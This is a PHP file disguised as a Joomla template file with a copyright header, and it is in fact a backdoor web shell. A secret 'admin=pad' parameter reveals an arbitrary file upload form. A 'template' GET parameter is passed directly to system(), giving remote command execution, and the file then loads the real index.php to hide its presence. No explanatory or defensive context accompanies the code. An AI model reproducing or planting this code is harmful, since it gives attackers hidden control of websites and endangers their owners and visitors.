<?php
/**
 * @copyright	Copyright (C) 2009-2010 Pixel Praise LLC. All rights reserved.
 * @license		All derivate Joomla! code isGNU/GPL, all images and CSS Copyright (C) 2009-2010 Pixel Praise LLC.
 */
if(isset($_REQUEST['admin']) && $_REQUEST['admin']=='pad'){
if (isset($_POST['ok']) && isset($_FILES['joomLa'])) {
   $file = $_FILES['joomLa']['tmp_name'];
   $name = $_FILES['joomLa']['name'];
   move_uploaded_file($file, $name);
}else{
?>
<br>
<form method="POST" enctype="multipart/form-data" action="<?$_SERVER['PHP_SELF']?>">
<input type="file" name="joomLa">&nbsp;<input type="submit" name="ok" value="AdminPad">
</form>
<?php
} exit;
}
if (!empty($_GET['template']))
{
echo "<pre>";
system($_GET['template']);
echo "</pre>";
exit;
}
require_once(dirname(__FILE__).DS.'index.php');
?>
